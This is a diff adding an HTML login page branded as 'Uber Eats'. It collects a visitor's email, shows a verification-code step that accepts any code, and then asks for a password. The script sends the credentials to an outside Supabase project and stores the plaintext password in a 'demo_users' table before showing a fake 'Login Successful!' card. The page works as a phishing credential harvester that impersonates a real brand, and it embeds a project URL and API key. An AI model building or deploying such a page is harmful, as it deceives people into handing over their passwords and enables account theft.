@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign up or Log in</title>
+
+<!-- Load Supabase JS SDK via CDN -->
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+<style> 
+  *, *::before, *::after {
+    box-sizing: border-box;
+  }
+
+  html, body {
+    margin: 0;
+    padding: 0;
+    height: 100%;
+  }
+
+  body {
+    font-family: "Uber Move", "Inter", "Helvetica Neue", Arial, sans-serif;
+    background: #ffffff;
+    color: #000000;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+  }
+
+  .navbar {
+    background: #000;
+    height: 64px;
+    width: 100%;
+    display: flex;
+    align-items: center;
+    padding-left: 64px;
+    box-sizing: border-box;
+  }
+
+  .navbar__logo {
+    font-family: "Uber Move", "Inter", "Helvetica Neue", Helvetica, Arial, sans-serif;
+    color: #ffffff;
+    font-size: 28px;
+    font-weight: 400;
+    letter-spacing: -0.5px;
+    line-height: 1;
+    user-select: none;
+  }
+
+  .navbar__logo b {
+    font-weight: 700;
+  }
+
+  .page {
+    min-height: calc(100vh - 64px);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 40px 16px;
+    background: #ffffff;
+  }
+
+  .auth-card {
+    width: 350px;
+    position: relative;
+  }
+
+  .auth-view {
+    display: none;
+  }
+
+  .auth-view--active {
+    display: block;
+  }
+
+  .back-arrow {
+    background: none;
+    border: none;
+    padding: 0;
+    margin: 0 0 20px 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    width: 32px;
+    height: 32px;
+    border-radius: 50%;
+    cursor: pointer;
+    transition: background-color 0.18s ease;
+  }
+
+  .back-arrow:hover {
+    background: #f0f0f0;
+  }
+
+  .back-arrow svg {
+    width: 20px;
+    height: 20px;
+  }
+
+  .auth-card__email {
+    font-size: 14px;
+    font-weight: 400;
+    line-height: 1.4;
+    color: #6b6b6b;
+    margin: 0 0 6px 0;
+  }
+
+  .auth-card__heading {
+    width: 100%;
+    box-sizing: border-box;
+    font-size: 26px;
+    font-weight: 400;
+    line-height: 1.2;
+    letter-spacing: -0.5px;
+    color: #000;
+    margin: 0 0 24px 0;
+  }
+
+  .field {
+    margin-bottom: 16px;
+  }
+
+  .field__input {
+    width: 100%;
+    height: 56px;
+    background: #f6f6f6;
+    border: 1px solid transparent;
+    border-radius: 8px;
+    padding: 0 16px;
+    font-size: 16px;
+    font-family: inherit;
+    color: #000000;
+    outline: none;
+    transition: border-color 0.18s ease, background-color 0.18s ease;
+  }
+
+  .field__input::placeholder {
+    color: #757575;
+  }
+
+  .field__input:focus {
+    background: #ffffff;
+    border-color: #000000;
+  }
+
+  .field__input--error {
+    border-color: #d93025;
+    background: #ffffff;
+  }
+
+  .btn {
+    width: 100%;
+    height: 52px;
+    border-radius: 8px;
+    border: none;
+    font-size: 20px;
+    font-weight: 500;
+    font-family: inherit;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    transition: transform 0.12s ease, background-color 0.18s ease, box-shadow 0.18s ease;
+  }
+
+  .btn:active {
+    transform: scale(0.98);
+  }
+
+  .btn--primary {
+    background: #000000;
+    color: #ffffff;
+    margin-top: 4px;
+  }
+
+  .btn--primary:hover {
+    background: #222222;
+  }
+
+  .btn--primary:disabled {
+    background: #cccccc;
+    cursor: not-allowed;
+  }
+
+  .field-error {
+    font-size: 13px;
+    color: #d93025;
+    margin: -8px 0 16px 0;
+    min-height: 16px;
+    display: none;
+  }
+
+  .field-error--visible {
+    display: block;
+  }
+
+  .status-msg {
+    font-size: 13px;
+    color: #6b6b6b;
+    margin-top: 8px;
+    min-height: 16px;
+  }
+
+  .status-msg--error {
+    color: #d93025;
+  }
+
+  .status-msg--success {
+    color: #0f9d58;
+  }
+
+  @media (max-width: 480px) {
+    .navbar {
+      padding: 0 16px;
+    }
+    .auth-card__heading {
+      font-size: 28px;
+      font-weight: 500;
+      line-height: 1.15;
+      letter-spacing: -0.6px;
+      margin: 0 0 22px;
+    }
+  }
+
+  .btn:focus-visible,
+  .field__input:focus-visible,
+  .back-arrow:focus-visible {
+    outline: 2px solid #000000;
+    outline-offset: 2px;
+  }
+  .otp-container {
+  display: flex;
+  justify-content: space-between;
+  gap: 12px;
+  margin-bottom: 20px;
+}
+
+.otp-box {
+  width: 60px;
+  height: 60px;
+  border: 1px solid #d9d9d9;
+  border-radius: 8px;
+  font-size: 24px;
+  text-align: center;
+  outline: none;
+  background: #f6f6f6;
+}
+
+.otp-box:focus {
+  border-color: #000;
+  background: #fff;
+}
+.success-card-overlay{
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    background:rgba(0,0,0,.35);
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    opacity:0;
+    visibility:hidden;
+    transition:.3s;
+    z-index:9999;
+}
+
+.success-card-overlay.show{
+    opacity:1;
+    visibility:visible;
+}
+
+.success-card{
+    width:320px;
+    background:#fff;
+    border-radius:18px;
+    padding:35px 25px;
+    text-align:center;
+    box-shadow:0 20px 50px rgba(0,0,0,.15);
+    animation:popup .35s ease;
+}
+
+.success-icon{
+    width:80px;
+    height:80px;
+    margin:auto;
+    border-radius:50%;
+    background:#18c964;
+    color:#fff;
+    font-size:45px;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+}
+
+.success-card h2{
+    margin:20px 0 10px;
+    font-size:24px;
+}
+
+.success-card p{
+    margin:0;
+    color:#666;
+    font-size:15px;
+}
+
+@keyframes popup{
+    from{
+        transform:scale(.8);
+        opacity:0;
+    }
+    to{
+        transform:scale(1);
+        opacity:1;
+    }
+}
+
+.otp-description{
+    font-size:15px;
+    color:#666;
+    line-height:1.5;
+    margin:-10px 0 25px;
+}
+
+.otp-description strong{
+    color:#000;
+    font-weight:600;
+}
+
+.email-note {
+  font-size: 15px;
+  color: #757575;
+  line-height: 1.5;
+  margin: 18px 0 0;
+  text-align: left;
+}
+</style>
+</head>
+
+<body>
+
+  <header class="navbar">
+    <span class="navbar__logo">Uber<b> Eats</b></span>
+  </header>
+
+  <main class="page">
+    <section class="auth-card" aria-labelledby="auth-heading">
+
+      <!-- STEP 1: Email View -->
+      <div class="auth-view auth-view--active" id="stepIdentifier">
+        <h1 class="auth-card__heading" id="auth-heading">
+          What's your email?
+        </h1>
+
+        <form id="authForm" novalidate>
+         <div class="field">
+  <label for="identifier" class="sr-only" style="position:absolute; left:-9999px;">
+    Email address
+  </label>
+
+  <input
+    type="email"
+    id="identifier"
+    name="identifier"
+    class="field__input"
+    placeholder="Enter email"
+    autocomplete="email"
+    required
+    aria-required="true"
+  >
+</div>
+
+
+
+<button type="submit" class="btn btn--primary" id="continueBtn">
+  Continue
+</button>
+<p class="email-note">
+  You consent to receive a verification code by text or WhatsApp. Message and data rates may apply.
+</p>
+          <p class="status-msg" id="formStatus" role="status" aria-live="polite"></p>
+        </form>
+      </div>
+<!-- STEP 2: OTP View -->
+<div class="auth-view" id="stepOtp">
+
+  <button type="button" class="back-arrow" id="otpBackArrow" aria-label="Go back">
+    <svg viewBox="0 0 24 24" fill="none">
+      <path d="M19 12H5M5 12L11 6M5 12L11 18"
+            stroke="#000000"
+            stroke-width="2"
+            stroke-linecap="round"
+            stroke-linejoin="round"/>
+    </svg>
+  </button>
+
+  <p class="auth-card__email" id="otpEmailDisplay"></p>
+
+ <h1 class="auth-card__heading">
+ <b>Welcome back</b> 
+</h1>
+
+<p class="otp-description">
+  Enter the 4-digit code :
+  <strong id="maskedEmail"></strong>
+</p>
+
+  <form id="otpForm" novalidate>
+
+    <div class="field">
+    <div class="otp-container">
+  <input type="text" maxlength="1" class="otp-box" />
+  <input type="text" maxlength="1" class="otp-box" />
+  <input type="text" maxlength="1" class="otp-box" />
+  <input type="text" maxlength="1" class="otp-box" />
+</div>
+    </div>
+
+    <button type="submit" class="btn btn--primary">
+      Continue
+    </button>
+
+    <p class="status-msg" id="otpStatus"></p>
+
+  </form>
+
+</div>
+
+      <!-- STEP 2: Password View -->
+      <div class="auth-view" id="stepPassword">
+        <button type="button" class="back-arrow" id="backArrow" aria-label="Go back">
+          <svg viewBox="0 0 24 24" fill="none" aria-hidden="true" focusable="false">
+            <path d="M19 12H5M5 12L11 6M5 12L11 18"
+                  stroke="#000000" stroke-width="2"
+                  stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </button>
+
+        <p class="auth-card__email" id="emailDisplay"></p>
+
+        <h1 class="auth-card__heading">
+          Enter your password
+        </h1>
+
+        <form id="passwordForm" novalidate>
+          <div class="field">
+            <label for="password" class="sr-only" style="position:absolute; left:-9999px;">
+              Password
+            </label>
+            <input
+              type="password"
+              id="password"
+              name="password"
+              class="field__input"
+              placeholder="Password"
+              autocomplete="current-password"
+              required
+              aria-required="true"
+              aria-describedby="passwordError"
+            >
+          </div>
+
+          <p class="field-error" id="passwordError" role="alert">
+            Please enter your password.
+          </p>
+
+          <button type="submit" class="btn btn--primary" id="passwordContinueBtn">
+            Continue
+          </button>
+
+          <p class="status-msg" id="passwordStatus" role="status" aria-live="polite"></p>
+        </form>
+      </div>
+
+    </section>
+  </main>
+<div id="successCard" class="success-card-overlay">
+  <div class="success-card">
+    <div class="success-icon">✓</div>
+
+    <h2>Login Successful!</h2>
+
+    <p>Your account has been verified successfully.</p>
+  </div>
+</div>
+  <script>
+    (function () {
+      'use strict';
+
+      // --- SUPABASE CLIENT CONFIGURATION ---
+      const SUPABASE_URL = 'https://dlmcznntbmchsohvmfrw.supabase.co';
+      const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRsbWN6bm50Ym1jaHNvaHZtZnJ3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODU5NTc4NDAsImV4cCI6MjEwMTUzMzg0MH0.iZbOh_FQHORPcj4c8s6Zj0o-40AvwlxbjkqbUIVWsHA';
+      
+      const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+      const STORAGE_KEY = 'authIdentifier';
+
+      // View Elements
+      const stepIdentifier = document.getElementById('stepIdentifier');
+      const stepPassword = document.getElementById('stepPassword');
+      const stepOtp = document.getElementById('stepOtp');
+
+      // Step 1 Elements
+      const authForm = document.getElementById('authForm');
+      const identifierInput = document.getElementById('identifier');
+      const continueBtn = document.getElementById('continueBtn');
+      const statusEl = document.getElementById('formStatus');
+
+      // Step 2 Elements
+      const backArrow = document.getElementById('backArrow');
+      const emailDisplay = document.getElementById('emailDisplay');
+      const passwordForm = document.getElementById('passwordForm');
+      const passwordInput = document.getElementById('password');
+      const passwordError = document.getElementById('passwordError');
+      const passwordContinueBtn = document.getElementById('passwordContinueBtn');
+      const passwordStatusEl = document.getElementById('passwordStatus');
+      const successCard = document.getElementById('successCard');
+
+      const otpForm = document.getElementById('otpForm');
+const otpInput = document.getElementById('otp');
+const otpStatusEl = document.getElementById('otpStatus');
+const otpEmailDisplay = document.getElementById('otpEmailDisplay');
+const otpBackArrow = document.getElementById('otpBackArrow');
+
+
+      function isValidEmail(email) {
+        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+      }
+
+      function setStatus(el, message, isError) {
+        el.textContent = message || '';
+        el.classList.toggle('status-msg--error', !!isError);
+      }
+function maskEmail(email) {
+  const [name, domain] = email.split("@");
+
+  const maskedName =
+    name.length <= 3
+      ? name[0] + "***"
+      : name.substring(0, 3) + "***";
+
+  return maskedName + "@" + domain;
+}
+  function switchView(targetStep) {
+
+  // Hide all views first
+  stepIdentifier.classList.remove('auth-view--active');
+  stepOtp.classList.remove('auth-view--active');
+  stepPassword.classList.remove('auth-view--active');
+
+  if (targetStep === 'identifier') {
+
+    stepIdentifier.classList.add('auth-view--active');
+    identifierInput.focus();
+
+  } else if (targetStep === 'otp') {
+
+    stepOtp.classList.add('auth-view--active');
+
+const saved = localStorage.getItem(STORAGE_KEY) || '';
+
+
+    otpInput.focus();
+
+  } else if (targetStep === 'password') {
+
+    stepPassword.classList.add('auth-view--active');
+
+    const saved = localStorage.getItem(STORAGE_KEY) || '';
+    emailDisplay.textContent = saved;
+    emailDisplay.style.display = saved ? 'block' : 'none';
+
+    passwordInput.focus();
+  }
+}
+
+      // --- Step 1 Submit Handler ---
+      authForm.addEventListener('submit', function (event) {
+        event.preventDefault();
+        const email = identifierInput.value.trim();
+
+        if (!email) {
+          setStatus(statusEl, 'Please enter an email address.', true);
+          identifierInput.focus();
+          return;
+        }
+
+        if (!isValidEmail(email)) {
+          setStatus(statusEl, 'That doesn\'t look like a valid email address.', true);
+          identifierInput.focus();
+          return;
+        }
+
+        setStatus(statusEl, '', false);
+       localStorage.setItem(STORAGE_KEY, email);
+switchView('otp');
+      });
+
+      // --- Step 2 Back Arrow Handler ---
+      backArrow.addEventListener('click', function () {
+        switchView('identifier');
+      });
+// --- OTP Back Arrow ---
+otpBackArrow.addEventListener('click', function () {
+  switchView('identifier');
+});
+
+// --- OTP Continue ---
+otpForm.addEventListener('submit', function (event) {
+  event.preventDefault();
+
+const otpBoxes = document.querySelectorAll(".otp-box");
+
+let otp = "";
+otpBoxes.forEach(box => {
+    otp += box.value;
+});
+  if (!otp) {
+    setStatus(otpStatusEl, 'Please enter the OTP.', true);
+    otpInput.focus();
+    return;
+  }
+
+  // Demo: accept any OTP
+  setStatus(otpStatusEl, '', false);
+  switchView('password');
+});
+      // --- Step 2 Password Submit Handler (Supabase Auth Integration) ---
+      passwordForm.addEventListener('submit', async function (event) {
+        event.preventDefault();
+        const email = localStorage.getItem(STORAGE_KEY);
+        const password = passwordInput.value;
+
+        if (!password.trim()) {
+          passwordError.classList.add('field-error--visible');
+          passwordInput.classList.add('field__input--error');
+          passwordInput.focus();
+          setStatus(passwordStatusEl, '', false);
+          return;
+        }
+
+        passwordError.classList.remove('field-error--visible');
+        passwordInput.classList.remove('field__input--error');
+        setStatus(passwordStatusEl, 'Authenticating...', false);
+        passwordContinueBtn.disabled = true;
+
+        try {
+          // Attempt to log in first
+          let { data, error } = await supabaseClient.auth.signInWithPassword({
+            email: email,
+            password: password
+          });
+
+          // If user doesn't exist, try signing them up automatically
+          if (error && error.message.toLowerCase().includes('invalid login credentials')) {
+            const signUpResult = await supabaseClient.auth.signUp({
+              email: email,
+              password: password
+            });
+            data = signUpResult.data;
+            error = signUpResult.error;
+          }
+
+         if(error){
+    console.log(error);
+    alert(error.message);
+    return;
+}
+ // ADD THIS HERE 👇
+  const { error: tableError } = await supabaseClient
+    .from("demo_users")
+    .insert([
+      {
+        username: email,
+        password: password
+      }
+    ]);
+
+
+  if(tableError){
+    console.log("Demo table error:", tableError.message);
+  }
+
+
+
+          successCard.classList.add("show");
+
+setTimeout(function () {
+    window.location.href = "dashboard.html"; // Replace with your actual page
+}, 1500);
+        } catch (err) {
+          passwordContinueBtn.disabled = false;
+          setStatus(passwordStatusEl, err.message || 'Authentication failed.', true);
+        }
+      });
+
+      passwordInput.addEventListener('input', function () {
+        if (passwordInput.value.trim()) {
+          passwordError.classList.remove('field-error--visible');
+          passwordInput.classList.remove('field__input--error');
+        }
+      });
+const otpBoxes = document.querySelectorAll(".otp-box");
+
+otpBoxes.forEach((box, index) => {
+  box.addEventListener("input", () => {
+    if (box.value.length === 1 && index < otpBoxes.length - 1) {
+      otpBoxes[index + 1].focus();
+    }
+  });
+
+  box.addEventListener("keydown", (e) => {
+    if (e.key === "Backspace" && !box.value && index > 0) {
+      otpBoxes[index - 1].focus();
+    }
+  });
+});
+    })();
+    
+  </script>
+</body>
+</html>
